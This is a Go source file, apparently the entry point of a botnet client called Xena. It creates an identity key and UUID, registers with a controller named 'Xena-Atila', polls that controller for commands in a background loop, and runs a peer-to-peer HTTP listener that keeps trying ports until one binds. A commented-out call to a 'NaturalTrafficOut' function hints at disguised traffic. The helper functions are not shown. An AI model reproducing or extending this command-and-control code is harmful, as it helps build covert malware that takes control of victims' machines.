package xena

import (
	"crypto/x509"
	"encoding/base64"
	"fmt"
	"net/http"
	"strconv"

	"github.com/google/uuid"
)

// Used for authentication.
var privateIdentificationKey = generatePrivateKey()

// Generate the unique identifier.
var id uuid.UUID = uuid.New()

func main() {
	// test := NaturalTrafficOut(time.Now().UnixNano(), "YXNkaGlhaGlkaHNpdWhnZjdkODR0ODdnd2lyZ3NrN2dpa3c4czdndDNpdWdyZnNranVnZWlrODdmZ2VrOGlncmk4NDVnZnVzZWZ0cnVrc2dmODR0ZW9mZ2t1Zmdza2VyZ3N0a2V0c2U0a3Rna3czaGs5Mjh5a2V3Z3Rrcmd0YWdlZGlrYXRnd2kzazg1a3J3dWd0a2F1Z2VydGtpenNhd2VoZ3Rhc2h0b3NhN3dlMzV5YTg0NzNnNWE4N3I4c293Z3J6aXRsZHZqYmcseGhqZGJnLHhqa2Jkcmxpc3R1Z2hrbGlydXRoZ2xza2llcmd0a2llcnN1Cg==")
	// insertionPayload, marshalErr := json.Marshal(test)
	// if marshalErr != nil {
	// 	fmt.Println(marshalErr.Error())
	// }
	// fmt.Println(string(insertionPayload))
	// fmt.Println("\n\n\n\n")

	// Not correct.
	enc := x509.MarshalPKCS1PublicKey(&privateIdentificationKey.PublicKey)

	// Identifies itself to the Xena-Atila.
	identify(id.String(), base64.StdEncoding.EncodeToString(enc))

	// Fetch new messages in a non-blocking loop.
	go fetchAndInterpretMessages(id.String())

	// Our main router used for interpreting Peer 2 Peer communication.
	http.HandleFunc("/", globalRequestHandler)

	// Generate a port to which we may bind to.
	appPort := currentActivePort()

	// Boot our HTTP web server used for Peer 2 Peer communication
	// Later we shall change server's port based on the current time.
	// This would be done without restarting the program. (yet to be implemented, feel free to open a Pull-Request)
bootServer:
	fmt.Println("Trying port", appPort)
	error := http.ListenAndServe(":"+strconv.Itoa(appPort), nil)
	if error != nil {
		appPort++
		goto bootServer
	}
}
